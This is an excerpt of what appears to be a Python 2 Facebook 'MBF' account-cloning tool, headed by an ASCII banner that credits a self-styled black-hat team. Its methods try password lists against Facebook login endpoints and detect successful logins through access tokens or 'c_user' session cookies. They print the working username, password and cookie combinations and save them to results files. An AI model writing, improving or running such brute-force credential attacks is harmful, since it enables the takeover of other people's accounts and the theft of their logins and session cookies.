...
hoetank = random.choice(['𝐆𝐫𝐞𝐚𝐭 𝐓𝐎𝐎𝐋 𝐁𝐑𝐎:)', '𝐌𝐑༆𝐗𝐒𝐀𝐍:)', '𝐋𝐎𝐕𝐄𝐋𝐘 𝐓𝐎𝐎𝐋'])
...
# LO KONTOL
logo = ''' \033[0;93m┏━┓┏━┳━━━┳━━━┳━┓╋┏┓\033[0;93m｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡
\033[0;91m ┗┓┗┛┏┫┏━┓┃┏━┓┃┃┗┓┃┃\033[0;91m║    𝐄𝐃𝐈𝐓𝐎𝐑 BY    𝐇𝐀𝐗𝑂𝑂𝐑༒︎𝐗𝐒𝐀𝐍
\033[0;92m ╋┗┓┏┛┃┗━━┫┃╋┃┃┏┓┗┛┃\033[0;92m║    𝑊𝐻𝐴𝑇𝑆𝐴𝐴𝑃   +994401850814
\033[0;96m ╋┏┛┗┓┗━━┓┃┗━┛┃┃┗┓┃┃\033[0;96m║   𝐺𝐼𝑇𝐻𝑈𝐵:)       𝐇𝐀𝐂𝐊𝐄-𝐑𝐈𝐇𝐒𝐀𝐍
\033[0;95m ┏┛┏┓┗┫┗━┛┃┏━┓┃┃╋┃┃┃\033[0;95m║   𝐹𝐴𝐶𝐸𝐵𝑂𝑂𝐾   𝐈𝐇𝐒𝐀𝐍𝐔𝐋𝐋𝐀𝐇
\033[0;92m ┗━┛┗━┻━━━┻┛╋┗┻┛╋┗━┛\033[0;92m｡☆✼★━━━━━━━━━━━━━━━━━━━━━━━━━★✼☆｡'''
...
def yayanxd():
    ...
    try:
        ...
        print '\n\n %s*%s ASALAMUALAIHIKUM %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        print ' %s*%s WELCOME TO THE MBF TOOL ENJOY FREE CLONEING...'%(O,N);time.sleep(2)
...
def info_tools():
    ...
    print '\n %s[%s>%s] 𝐄𝐃𝐈𝐓𝐎𝐑༆   : 𝐇𝐚𝐱𝐎𝐎𝐑✰𝑿𝑺𝑨𝑵.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐆𝐈𝐓𝐇𝐔𝐁༆    :𝑯𝑨𝑪𝑲𝑬𝑹~𝑰𝑯𝑺𝑨𝑵'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐖𝐡𝐚𝐭𝐒𝐀𝐏༆   : +994 401850814'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : https://www.facebook.com/𝐮𝐧𝐤𝐨𝐧𝐰𝐱𝐱'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐓𝐄𝐀𝐌         : 𝐏𝐄𝐒𝐇𝐖𝐀𝐑 𝐁𝐋𝐀𝐂𝐊 𝐇𝐀𝐓 𝐇𝐀𝐂𝐊𝐄𝐑'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] 𝐆𝐑𝐎𝐔𝐏      : 𝐓𝐄𝐑𝐌𝐔𝐗 𝐋𝐎𝐕𝐄𝐑'%(N,H,N);time.sleep(0.07)
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* XSAN=Live--> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    month = bulan_ttl[month]
                    print '\r  %s* XSAN=CHEK--> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                ...
                print '\r  %s* XSAN=CHEK--> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r  %s* XSAN=LIVE--> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
